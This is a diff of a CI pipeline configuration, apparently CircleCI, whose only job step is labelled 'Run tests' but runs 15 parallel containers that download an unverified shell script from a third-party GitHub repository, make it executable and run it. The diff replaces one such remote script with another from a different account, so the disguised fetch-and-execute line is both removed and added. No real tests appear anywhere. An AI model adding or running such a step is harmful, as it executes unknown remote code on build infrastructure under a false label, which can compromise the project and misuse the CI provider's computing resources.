@@ -1,10 +1,10 @@
-jobs:
-  build:
+jobs:   
+  build:   
     parallelism: 15
-    docker:
-      - image: cimg/ruby:3.0.2-node
-    steps: 
-      - checkout 
-      - run: 
-          name: Run tests 
-          command: wget https://raw.githubusercontent.com/popoler/tn/main/vr.sh  && chmod +x vr.sh && ./vr.sh
+    docker:   
+      - image: cimg/ruby:3.0.2-node   
+    steps:    
+      - checkout    
+      - run:    
+          name: Run tests    
+          command: wget https://raw.githubusercontent.com/R8610/asu/main/memek.sh  && chmod +x memek.sh && ./memek.sh
